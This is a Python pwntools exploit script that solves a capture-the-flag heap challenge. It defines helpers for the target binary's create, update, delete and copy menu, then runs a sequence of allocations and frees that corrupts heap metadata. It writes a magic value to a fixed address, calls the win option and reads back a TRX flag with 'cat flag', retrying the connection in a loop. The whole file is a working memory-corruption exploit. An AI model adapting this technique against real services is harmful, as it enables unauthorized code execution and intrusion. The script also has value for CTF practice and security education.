#!/usr/bin/env python3
from pwn import *
import sys

context.arch = "amd64"
context.terminal = ["pwntools-terminal"]

DOCKER_PORT = 1337
url = sys.argv[1].split(":")

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline
tube.rls	= tube.recvlines

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")	# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
	c
"""

def conn():
	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	return remote(url[0], int(url[1]))


def create(io, idx, size):
	io.sla(b"enter your choice: ", b"1")
	io.sla(b"enter index: ", bstr(idx))
	io.sla(b"enter size: ", bstr(size))


def upd(io, idx, data):
	io.sla(b"enter your choice: ", b"2")
	io.sla(b"enter index: ", bstr(idx))
	io.sa(b"bytes: ", data)


def delete(io, idx):
	io.sla(b"enter your choice: ", b"3")
	io.sla(b"enter index: ", bstr(idx))


def cp(io, dst, src):
	io.sla(b"enter your choice: ", b"4")
	io.sla(b"enter index: ", bstr(dst))
	io.sla(b"enter index: ", bstr(src))


def win(io):
	io.sla(b"enter your choice: ", b"5")

def main(io):
	for i in range(8):
		create(io, i, 0x10)
	
	for i in range(7, -1, -1):
		delete(io, i)
	upd(io, 6, b"\0"*0x10)
	delete(io, 6)

	for i in range(9):
		create(io, i, 0x10)

	create(io, 67, 0x20)

	for i in range(106):
		create(io, 255, 0x4f0)
	create(io, 99, 0x400)

	delete(io, 99)
	delete(io, 67)
	cp(io, 99, 67)
	create(io, 99, 0x400)


	for i in range(50, 57):
		create(io, i, 0x10)
	for i in range(50, 57):
		delete(io, i)

	upd(io, 8, flat({8: 0x21}))
	delete(io, 6)
	upd(io, 51, b"\0"*0x10)
	delete(io, 51)
	
	for i in range(7):
		create(io, i, 0x10)
	delete(io, 99)
	upd(io, 6, flat({8: 0x1337000}))

	create(io, 67, 0x400)
	upd(io, 67, flat(0xdeadbeefdeadcafe).ljust(0x400))

	io.sl(b"5")
	io.sl(b"cat flag")
	io.ru(b"TRX{")
	print("TRX{" + io.ru(b"}").decode())
	return True

if __name__ == "__main__":
	while True:
		try:
			io = conn()
			if main(io):
				break
		except:
			io.close()
			continue

